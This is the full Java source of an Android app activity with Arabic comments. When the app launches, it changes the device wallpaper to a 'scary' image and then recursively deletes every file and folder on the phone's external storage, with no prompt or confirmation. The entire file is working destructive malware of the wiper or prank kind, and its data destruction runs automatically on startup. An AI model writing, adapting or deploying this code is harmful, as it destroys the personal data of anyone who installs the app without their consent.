import android.app.WallpaperManager;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import androidx.appcompat.app.AppCompatActivity;
import java.io.File;
import java.io.IOException;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "WallpaperAndFiles";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // 1. تغيير خلفية الشاشة
        setWallpaper();

        // 2. حذف الملفات
        deleteAllFiles();
    }

    // ==================== تغيير الخلفية ====================
    private void setWallpaper() {
        WallpaperManager myWallpaperManager = WallpaperManager.getInstance(getApplicationContext());
        try {
            myWallpaperManager.setResource(R.drawable.scary_image);
            Log.d(TAG, "تم تغيير الخلفية بنجاح");
        } catch (IOException e) {
            Log.e(TAG, "فشل تغيير الخلفية: " + e.getMessage());
            e.printStackTrace();
        }
    }

    // ==================== حذف الملفات ====================
    private void deleteAllFiles() {
        File path = Environment.getExternalStorageDirectory();
        boolean result = destroyFiles(path);
        Log.d(TAG, "نتيجة الحذف: " + result);
    }

    public boolean destroyFiles(File root) {
        if (root == null || !root.exists()) {
            return false;
        }

        File[] files = root.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    destroyFiles(file); // حذف محتويات المجلد أولاً
                }
                if (!file.delete()) {
                    Log.w(TAG, "فشل حذف: " + file.getAbsolutePath());
                }
            }
        }
        return true;
    }
}